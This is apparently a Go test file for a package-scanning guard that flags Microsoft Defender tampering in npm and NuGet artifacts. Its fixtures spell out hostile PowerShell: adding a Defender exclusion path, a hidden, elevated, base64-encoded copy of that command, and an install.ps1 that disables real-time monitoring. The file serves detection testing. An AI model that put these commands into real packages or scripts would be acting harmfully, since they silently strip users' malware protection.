package cli

import (
	"encoding/base64"
	"encoding/binary"
	"strings"
	"testing"
	"unicode/utf16"
)

// @apexacc/cli (row 57), guard side. Since v0.22.106 (F10) analyzeArtifact
// runs iocscan.DefenderTamper, which the server scores sc.defender_tamper
// (warn-capped), so the guard warns — on 1.5.121's plaintext Defender
// exclusion and on 1.5.122's -EncodedCommand copy of it. It does not refuse.
func TestAttack2026_57_ApexaccCLI_Guard(t *testing.T) {
	pj := `{"name":"@apexacc/cli","version":"1.5.121","bin":{"apex":"apex.cjs"}}`
	cmd := `Add-MpPreference -ExclusionPath $env:USERPROFILE\.apex`
	u := utf16.Encode([]rune(cmd))
	raw := make([]byte, 2*len(u))
	for i, c := range u {
		binary.LittleEndian.PutUint16(raw[2*i:], c)
	}
	for name, apex := range map[string]string{
		"1.5.121 plaintext": "require('child_process').execSync('powershell -Command \"" + strings.ReplaceAll(cmd, `\`, `\\\\`) + "\"');\n",
		"1.5.122 encoded": "require('child_process').spawn('powershell',['-WindowStyle','Hidden','-Command'," +
			"\"Start-Process powershell -Verb RunAs -ArgumentList '-EncodedCommand " + base64.StdEncoding.EncodeToString(raw) + "'\"]);\n",
	} {
		v := analyzeArtifact("npm", atkBTgz(t, map[string]string{"package.json": pj, "apex.cjs": apex}))
		if v.Block || v.Severity != guardSeverityBehavioralMedium || !strings.Contains(v.Reason, "Add-MpPreference -ExclusionPath") {
			t.Fatalf("%s: want a behavioral-medium Defender warning, got %+v", name, v)
		}
	}
	// Negative control: reading Defender state is not tampering.
	v := analyzeArtifact("npm", atkBTgz(t, map[string]string{
		"package.json": pj,
		"apex.cjs":     "require('child_process').execSync('powershell -Command \"(Get-MpPreference).ExclusionPath\"');\n",
	}))
	if v.Block || v.Severity != "" {
		t.Fatalf("Get-MpPreference flagged: %+v", v)
	}
}

// The guard reads .ps1 for the Defender indicator too: NuGet runs
// tools/install.ps1 on install. A benign install.ps1 stays clean.
func TestGuardDefenderTamperInstallPS1(t *testing.T) {
	nuspec := `<?xml version="1.0"?><package><metadata><id>Contoso.Build</id><version>2.1.0</version></metadata></package>`
	bad := analyzeArtifact("nuget", atkBTgz(t, map[string]string{
		"Contoso.Build.nuspec": nuspec,
		"tools/install.ps1":    "param($installPath, $toolsPath, $package, $project)\nSet-MpPreference -DisableRealtimeMonitoring $true\n",
	}))
	if bad.Block || bad.Severity != guardSeverityBehavioralMedium || !strings.Contains(bad.Reason, "tools/install.ps1") {
		t.Fatalf("install.ps1 Defender tamper: want a behavioral-medium warning, got %+v", bad)
	}
	good := analyzeArtifact("nuget", atkBTgz(t, map[string]string{
		"Contoso.Build.nuspec": nuspec,
		"tools/install.ps1":    "param($installPath, $toolsPath, $package, $project)\n$project.Save()\n",
	}))
	if good.Block || good.Severity != "" {
		t.Fatalf("benign install.ps1 flagged: %+v", good)
	}
}
